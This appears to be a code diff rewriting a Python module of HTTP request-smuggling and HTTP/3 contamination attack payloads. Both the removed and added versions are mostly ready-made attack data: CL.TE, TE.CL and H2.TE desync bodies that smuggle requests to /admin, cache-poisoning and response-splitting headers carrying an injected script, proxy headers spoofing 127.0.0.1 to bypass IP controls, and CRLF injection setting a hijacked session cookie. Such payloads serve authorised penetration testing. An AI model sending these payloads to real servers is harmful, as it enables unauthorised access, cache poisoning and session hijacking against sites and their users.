@@ -1,433 +1,206 @@
 """
 HTTP/3 Connection Contamination Attack Payloads
 
-This module contains various attack payloads for testing connection contamination
-vulnerabilities including request smuggling, header injection, and protocol-specific attacks.
-
+Provides AttackPayload definitions and PayloadGenerator for all exploitation
+vectors: request smuggling, cache poisoning, and header injection.
 """
 
-from typing import Dict, List, Tuple
-from dataclasses import dataclass
+from dataclasses import dataclass, field
+from typing import Dict, List
 
 
 @dataclass
 class AttackPayload:
-    """Represents an attack payload"""
+    """Represents a single attack payload with associated headers and body."""
     name: str
-    description: str
     headers: Dict[str, str]
-    body: str
-    expected_behavior: str
-    detection_method: str
-
-
-class RequestSmugglingPayloads:
-    """Request smuggling attack payloads"""
-    
-    @staticmethod
-    def cl_te_basic() -> AttackPayload:
-        """
-        CL-TE (Content-Length vs Transfer-Encoding) desync attack
-        Front-end uses Content-Length, back-end uses Transfer-Encoding
-        """
-        return AttackPayload(
-            name="CL-TE Basic Smuggling",
-            description="Front-end processes Content-Length, back-end processes Transfer-Encoding",
-            headers={
-                "Content-Length": "13",
-                "Transfer-Encoding": "chunked"
-            },
-            body="0\r\n\r\nSMUGGLED",
-            expected_behavior="Back-end should process smuggled request",
-            detection_method="Check if smuggled request affects subsequent requests"
-        )
-    
-    @staticmethod
-    def te_cl_basic() -> AttackPayload:
-        """
-        TE-CL (Transfer-Encoding vs Content-Length) desync attack
-        Front-end uses Transfer-Encoding, back-end uses Content-Length
-        """
-        return AttackPayload(
-            name="TE-CL Basic Smuggling",
-            description="Front-end processes Transfer-Encoding, back-end processes Content-Length",
-            headers={
-                "Content-Length": "4",
-                "Transfer-Encoding": "chunked"
-            },
-            body="5c\r\nSMUGGLED REQUEST\r\n0\r\n\r\n",
-            expected_behavior="Back-end should see truncated request",
-            detection_method="Monitor response timing and content differences"
-        )
-    
-    @staticmethod
-    def te_te_obfuscation() -> AttackPayload:
-        """
-        TE-TE desync using Transfer-Encoding obfuscation
-        Both use Transfer-Encoding but one doesn't recognize obfuscated header
-        """
-        return AttackPayload(
-            name="TE-TE Obfuscation",
-            description="Obfuscate Transfer-Encoding to cause desync",
-            headers={
-                "Transfer-Encoding": "chunked",
-                "Transfer-encoding": "identity"  # Note lowercase 'e'
-            },
-            body="0\r\n\r\nSMUGGLED",
-            expected_behavior="One server ignores obfuscated header",
-            detection_method="Check for request processing differences"
-        )
-    
-    @staticmethod
-    def cl_te_with_prefix() -> AttackPayload:
-        """CL-TE with request prefix smuggling"""
-        smuggled_request = (
-            "GET /admin HTTP/1.1\r\n"
-            "Host: vulnerable-website.com\r\n"
-            "Content-Length: 10\r\n"
-            "\r\n"
-            "x="
-        )
-        
-        return AttackPayload(
-            name="CL-TE Prefix Smuggling",
-            description="Smuggle complete HTTP request as prefix",
-            headers={
-                "Content-Length": str(len(smuggled_request) + 2),
-                "Transfer-Encoding": "chunked"
-            },
-            body=f"0\r\n\r\n{smuggled_request}",
-            expected_behavior="Smuggled request executed on next connection",
-            detection_method="Monitor for unauthorized admin access"
-        )
-    
-    @staticmethod
-    def chunked_encoding_variants() -> List[AttackPayload]:
-        """Various chunked encoding variations for testing"""
-        variants = []
-        
-        # Space after chunk size
-        variants.append(AttackPayload(
-            name="Chunked with Space",
-            description="Space after chunk size",
-            headers={"Transfer-Encoding": "chunked"},
-            body="5 \r\nHello\r\n0\r\n\r\n",
-            expected_behavior="Some servers may misparse",
-            detection_method="Check response parsing"
-        ))
-        
-        # Tab after chunk size
-        variants.append(AttackPayload(
-            name="Chunked with Tab",
-            description="Tab character after chunk size",
-            headers={"Transfer-Encoding": "chunked"},
-            body="5\t\r\nHello\r\n0\r\n\r\n",
-            expected_behavior="Tab may cause parsing issues",
-            detection_method="Monitor for parsing errors"
-        ))
-        
-        # Multiple Transfer-Encoding headers
-        variants.append(AttackPayload(
-            name="Multiple Transfer-Encoding",
-            description="Multiple Transfer-Encoding headers",
-            headers={
-                "Transfer-Encoding": "chunked",
-                "Transfer-Encoding ": "identity"  # Note trailing space
-            },
-            body="0\r\n\r\n",
-            expected_behavior="Header confusion",
-            detection_method="Check which header is processed"
-        ))
-        
-        return variants
-
-
-class HTTP3SpecificPayloads:
-    """HTTP/3 and QUIC-specific attack payloads"""
-    
-    @staticmethod
-    def frame_injection() -> AttackPayload:
-        """HTTP/3 frame injection attack"""
-        return AttackPayload(
-            name="HTTP/3 Frame Injection",
-            description="Inject malicious HTTP/3 frames",
-            headers={
-                "Content-Type": "application/octet-stream",
-                ":method": "POST",
-                ":path": "/",
-                ":scheme": "https"
-            },
-            body="\x00\x00\x04\x01\x00\x00\x00\x00",  # Malformed frame
-            expected_behavior="Server may misprocess frame",
-            detection_method="Monitor for frame processing errors"
-        )
-    
-    @staticmethod
-    def zero_rtt_replay() -> AttackPayload:
-        """0-RTT replay attack payload"""
-        return AttackPayload(
-            name="0-RTT Replay Attack",
-            description="Replay 0-RTT data to cause duplicate operations",
-            headers={
-                "Early-Data": "1",
-                "Content-Type": "application/json"
-            },
-            body='{"action": "transfer", "amount": 1000}',
-            expected_behavior="Non-idempotent operation replayed",
-            detection_method="Check for duplicate transactions"
-        )
-    
-    @staticmethod
-    def qpack_bomb() -> AttackPayload:
-        """QPACK compression bomb"""
-        return AttackPayload(
-            name="QPACK Compression Bomb",
-            description="Exploit QPACK header compression",
-            headers={
-                "X-Large-Header": "A" * 65535,  # Maximum header size
-                "X-Compressed": "B" * 65535
-            },
-            body="",
-            expected_behavior="Excessive memory consumption",
-            detection_method="Monitor server resource usage"
-        )
-    
-    @staticmethod
-    def stream_multiplexing_abuse() -> AttackPayload:
-        """Stream multiplexing contamination"""
-        return AttackPayload(
-            name="Stream Multiplexing Abuse",
-            description="Abuse QUIC stream multiplexing",
-            headers={
-                "X-Stream-Priority": "urgent",
-                "X-Stream-Weight": "256"
-            },
-            body="STREAM_DATA",
-            expected_behavior="Stream priority manipulation",
-            detection_method="Monitor stream processing order"
-        )
-
-
-class HeaderInjectionPayloads:
-    """Header injection attack payloads"""
-    
-    @staticmethod
-    def crlf_injection() -> List[AttackPayload]:
-        """CRLF injection variants"""
-        payloads = []
-        
-        # Basic CRLF injection
-        payloads.append(AttackPayload(
-            name="Basic CRLF Injection",
-            description="Inject CRLF to add headers",
-            headers={
-                "X-Forwarded-For": "127.0.0.1\r\nX-Admin: true"
-            },
-            body="",
-            expected_behavior="Additional header injected",
-            detection_method="Check if X-Admin header is processed"
-        ))
-        
-        # Double CRLF for request splitting
-        payloads.append(AttackPayload(
-            name="Request Splitting",
-            description="Use double CRLF to split requests",
-            headers={
-                "X-Custom": "value\r\n\r\nGET /admin HTTP/1.1\r\nHost: target.com"
-            },
-            body="",
-            expected_behavior="Second request smuggled",
-            detection_method="Monitor for split request execution"
-        ))
-        
-        # Unicode normalization
-        payloads.append(AttackPayload(
-            name="Unicode CRLF",
-            description="Unicode characters that normalize to CRLF",
-            headers={
-                "X-Test": "value\u000d\u000aX-Injected: true"
-            },
-            body="",
-            expected_behavior="Unicode normalized to CRLF",
-            detection_method="Check header parsing"
-        ))
-        
-        return payloads
-    
-    @staticmethod
-    def host_header_injection() -> List[AttackPayload]:
-        """Host header manipulation payloads"""
-        return [
-            AttackPayload(
-                name="Duplicate Host Headers",
-                description="Multiple Host headers",
-                headers={
-                    "Host": "legitimate.com",
-                    "Host ": "attacker.com"  # Note trailing space
-                },
-                body="",
-                expected_behavior="Server confusion on which host to use",
-                detection_method="Check which host is processed"
-            ),
-            AttackPayload(
-                name="Host Header with Port",
-                description="Manipulate host with port",
-                headers={
-                    "Host": "legitimate.com:80@attacker.com"
-                },
-                body="",
-                expected_behavior="URL parsing confusion",
-                detection_method="Monitor backend routing"
-            )
-        ]
-
-
-class CachePoisoningPayloads:
-    """Cache poisoning attack payloads"""
-    
-    @staticmethod
-    def unkeyed_header_poisoning() -> List[AttackPayload]:
-        """Exploit unkeyed headers for cache poisoning"""
-        return [
-            AttackPayload(
-                name="X-Forwarded-Host Poisoning",
-                description="Poison cache via X-Forwarded-Host",
-                headers={
-                    "X-Forwarded-Host": "attacker.com",
-                    "X-Forwarded-Proto": "https"
-                },
-                body="",
-                expected_behavior="Cached response with attacker's host",
-                detection_method="Check cached response headers"
-            ),
-            AttackPayload(
-                name="X-Original-URL Poisoning",
-                description="Override URL via unkeyed header",
-                headers={
-                    "X-Original-URL": "/admin/delete?user=victim"
-                },
-                body="",
-                expected_behavior="Cache stores response for wrong URL",
-                detection_method="Verify cache key generation"
-            )
-        ]
-    
-    @staticmethod
-    def http_method_override() -> AttackPayload:
-        """HTTP method override for cache poisoning"""
-        return AttackPayload(
-            name="Method Override Poisoning",
-            description="Override HTTP method to poison cache",
-            headers={
-                "X-HTTP-Method-Override": "DELETE",
-                "X-Method-Override": "DELETE"
-            },
-            body="",
-            expected_behavior="GET request cached as DELETE",
-            detection_method="Check if method override affects caching"
-        )
-
-
-class ProtocolDowngradePayloads:
-    """Protocol downgrade attack payloads"""
-    
-    @staticmethod
-    def force_http2_downgrade() -> AttackPayload:
-        """Force downgrade from HTTP/3 to HTTP/2"""
-        return AttackPayload(
-            name="HTTP/3 to HTTP/2 Downgrade",
-            description="Force protocol downgrade",
-            headers={
-                "Alt-Svc": "clear",
-                "Upgrade": "h2c"
-            },
-            body="",
-            expected_behavior="Connection downgrades to HTTP/2",
-            detection_method="Monitor protocol version in use"
-        )
-    
-    @staticmethod
-    def alpn_manipulation() -> AttackPayload:
-        """ALPN protocol negotiation manipulation"""
-        return AttackPayload(
-            name="ALPN Manipulation",
-            description="Manipulate ALPN negotiation",
-            headers={
-                "Connection": "Upgrade",
-                "Upgrade": "h2c, http/1.1"
-            },
-            body="",
-            expected_behavior="Protocol negotiation confusion",
-            detection_method="Check negotiated protocol"
-        )
+    body: str = ""
+    description: str = ""
 
 
 class PayloadGenerator:
-    """Generate and manage attack payloads"""
-    
+    """Generates attack payloads for HTTP/3 connection contamination exploits."""
+
+    # -----------------------------------------------------------------------
+    # Request Smuggling Payloads (CL.TE / TE.CL / H2.TE desync)
+    # -----------------------------------------------------------------------
+    @staticmethod
+    def get_request_smuggling_payloads() -> List[AttackPayload]:
+        return [
+            # CL.TE: front-end uses Content-Length, back-end uses Transfer-Encoding
+            AttackPayload(
+                name="CL.TE Smuggling",
+                description="Content-Length / Transfer-Encoding desync — prepends smuggled prefix to next victim request",
+                headers={
+                    "Content-Type": "application/x-www-form-urlencoded",
+                    "Content-Length": "6",
+                    "Transfer-Encoding": "chunked",
+                    "Connection": "keep-alive",
+                },
+                body="0\r\n\r\nG",
+            ),
+            # TE.CL: front-end uses Transfer-Encoding, back-end uses Content-Length
+            AttackPayload(
+                name="TE.CL Smuggling",
+                description="Transfer-Encoding / Content-Length desync — injects a full secondary request",
+                headers={
+                    "Content-Type": "application/x-www-form-urlencoded",
+                    "Transfer-Encoding": "chunked",
+                    "Connection": "keep-alive",
+                },
+                body=(
+                    "5c\r\n"
+                    "POST /admin HTTP/1.1\r\n"
+                    "Host: TARGET\r\n"
+                    "Content-Type: application/x-www-form-urlencoded\r\n"
+                    "Content-Length: 15\r\n"
+                    "\r\n"
+                    "x=1\r\n"
+                    "0\r\n"
+                    "\r\n"
+                ),
+            ),
+            # HTTP/2 → HTTP/1 downgrade with TE injection
+            AttackPayload(
+                name="H2.TE Downgrade Smuggling",
+                description="HTTP/2 to HTTP/1.1 downgrade with Transfer-Encoding injection via pseudo-header",
+                headers={
+                    "Content-Type": "application/x-www-form-urlencoded",
+                    "Transfer-Encoding": "chunked",
+                    "te": "trailers",
+                    "Connection": "keep-alive",
+                },
+                body="0\r\n\r\nGET /admin HTTP/1.1\r\nHost: TARGET\r\n\r\n",
+            ),
+            # Obfuscated TE header to bypass WAF/normalisation
+            AttackPayload(
+                name="TE Obfuscation Smuggling",
+                description="Obfuscated Transfer-Encoding header to evade WAF normalisation",
+                headers={
+                    "Content-Type": "application/x-www-form-urlencoded",
+                    "Content-Length": "6",
+                    "Transfer-Encoding": "xchunked",   # non-standard value
+                    "Transfer-encoding": "chunked",    # duplicate with different case
+                    "Connection": "keep-alive",
+                },
+                body="0\r\n\r\nG",
+            ),
+        ]
+
+    # -----------------------------------------------------------------------
+    # Cache Poisoning Payloads
+    # -----------------------------------------------------------------------
+    @staticmethod
+    def get_cache_poisoning_payloads() -> List[AttackPayload]:
+        return [
+            # Unkeyed header — X-Forwarded-Host reflected in redirect / resource URLs
+            AttackPayload(
+                name="X-Forwarded-Host Cache Poison",
+                description="Unkeyed X-Forwarded-Host header poisons cache with attacker-controlled host in response",
+                headers={
+                    "X-Forwarded-Host": "attacker.com",
+                    "Cache-Control": "no-cache",
+                },
+            ),
+            # Fat GET — body on a GET request parsed by back-end but ignored by cache key
+            AttackPayload(
+                name="Fat GET Cache Poison",
+                description="GET request with body; back-end reads body param overriding query string — cache keyed on URL only",
+                headers={
+                    "Content-Type": "application/x-www-form-urlencoded",
+                    "Content-Length": "27",
+                    "X-HTTP-Method-Override": "GET",
+                },
+                body="param=attacker_controlled_val",
+            ),
+            # X-Original-URL / X-Rewrite-URL routing override
+            AttackPayload(
+                name="X-Original-URL Cache Poison",
+                description="Unkeyed routing header rewrites the path processed by the back-end while cache key remains /",
+                headers={
+                    "X-Original-URL": "/admin",
+                    "X-Rewrite-URL": "/admin",
+                    "Cache-Control": "no-cache",
+                },
+            ),
+            # HTTP Response Splitting via injected newlines in a header value
+            AttackPayload(
+                name="Header Injection Response Splitting",
+                description="CRLF injection in unkeyed header value forces response splitting and cache poisoning",
+                headers={
+                    "X-Forwarded-Host": "attacker.com\r\nContent-Length: 0\r\n\r\nHTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<script>alert(1)</script>",
+                    "Cache-Control": "no-cache",
+                },
+            ),
+        ]
+
+    # -----------------------------------------------------------------------
+    # Header Injection Payloads
+    # -----------------------------------------------------------------------
+    @staticmethod
+    def get_header_injection_payloads() -> List[AttackPayload]:
+        return [
+            # Host header injection — affects password-reset links, internal routing
+            AttackPayload(
+                name="Host Header Injection",
+                description="Overrides virtual-host routing; can poison password-reset / OAuth redirect URLs",
+                headers={
+                    "Host": "attacker.com",
+                    "X-Forwarded-Host": "attacker.com",
+                },
+            ),
+            # IP spoofing via proxy headers — bypasses IP-based ACLs
+            AttackPayload(
+                name="X-Forwarded-For IP Spoofing",
+                description="Spoofed originating IP to bypass IP-based access controls or rate limiting",
+                headers={
+                    "X-Forwarded-For": "127.0.0.1",
+                    "X-Real-IP": "127.0.0.1",
+                    "X-Originating-IP": "127.0.0.1",
+                    "X-Remote-IP": "127.0.0.1",
+                    "X-Client-IP": "127.0.0.1",
+                },
+            ),
+            # Internal routing override headers
+            AttackPayload(
+                name="Internal Routing Header Injection",
+                description="Proxy/load-balancer headers that may override upstream routing decisions",
+                headers={
+                    "X-Original-URL": "/admin",
+                    "X-Override-URL": "/admin",
+                    "X-Rewrite-URL": "/admin",
+                    "X-Custom-IP-Authorization": "127.0.0.1",
+                },
+            ),
+            # CRLF injection in User-Agent / Referer
+            AttackPayload(
+                name="CRLF Injection via User-Agent",
+                description="CRLF sequence injected into User-Agent to split the HTTP response",
+                headers={
+                    "User-Agent": "Mozilla/5.0\r\nInjected-Header: malicious-value",
+                    "Referer": "https://attacker.com\r\nSet-Cookie: session=hijacked",
+                },
+            ),
+            # HTTP/2 pseudo-header smuggling — injects prohibited headers
+            AttackPayload(
+                name="HTTP/2 Pseudo-Header Injection",
+                description="Injects Transfer-Encoding and Connection headers that are forbidden in HTTP/2 but processed by HTTP/1.1 back-ends",
+                headers={
+                    "transfer-encoding": "chunked",
+                    "connection": "keep-alive, Transfer-Encoding",
+                    "te": "trailers",
+                },
+            ),
+        ]
+
+    # -----------------------------------------------------------------------
+    # Unified accessor
+    # -----------------------------------------------------------------------
     @staticmethod
     def get_all_payloads() -> Dict[str, List[AttackPayload]]:
-        """Get all attack payloads organized by category"""
-        smuggling = RequestSmugglingPayloads()
-        http3 = HTTP3SpecificPayloads()
-        headers = HeaderInjectionPayloads()
-        cache = CachePoisoningPayloads()
-        downgrade = ProtocolDowngradePayloads()
-        
+        """Return all payload categories keyed by attack type."""
         return {
-            "request_smuggling": [
-                smuggling.cl_te_basic(),
-                smuggling.te_cl_basic(),
-                smuggling.te_te_obfuscation(),
-                smuggling.cl_te_with_prefix(),
-                *smuggling.chunked_encoding_variants()
-            ],
-            "http3_specific": [
-                http3.frame_injection(),
-                http3.zero_rtt_replay(),
-                http3.qpack_bomb(),
-                http3.stream_multiplexing_abuse()
-            ],
-            "header_injection": [
-                *headers.crlf_injection(),
-                *headers.host_header_injection()
-            ],
-            "cache_poisoning": [
-                *cache.unkeyed_header_poisoning(),
-                cache.http_method_override()
-            ],
-            "protocol_downgrade": [
-                downgrade.force_http2_downgrade(),
-                downgrade.alpn_manipulation()
-            ]
+            "request_smuggling": PayloadGenerator.get_request_smuggling_payloads(),
+            "cache_poisoning": PayloadGenerator.get_cache_poisoning_payloads(),
+            "header_injection": PayloadGenerator.get_header_injection_payloads(),
         }
-    
-    @staticmethod
-    def get_payload_by_name(name: str) -> AttackPayload:
-        """Get specific payload by name"""
-        all_payloads = PayloadGenerator.get_all_payloads()
-        for category_payloads in all_payloads.values():
-            for payload in category_payloads:
-                if payload.name == name:
-                    return payload
-        raise ValueError(f"Payload '{name}' not found")
-    
-    @staticmethod
-    def get_payloads_by_category(category: str) -> List[AttackPayload]:
-        """Get all payloads for a specific category"""
-        all_payloads = PayloadGenerator.get_all_payloads()
-        if category not in all_payloads:
-            raise ValueError(f"Category '{category}' not found")
-        return all_payloads[category]
-
-
-# Export commonly used payloads
-__all__ = [
-    'AttackPayload',
-    'RequestSmugglingPayloads',
-    'HTTP3SpecificPayloads',
-    'HeaderInjectionPayloads',
-    'CachePoisoningPayloads',
-    'ProtocolDowngradePayloads',
-    'PayloadGenerator'
-]
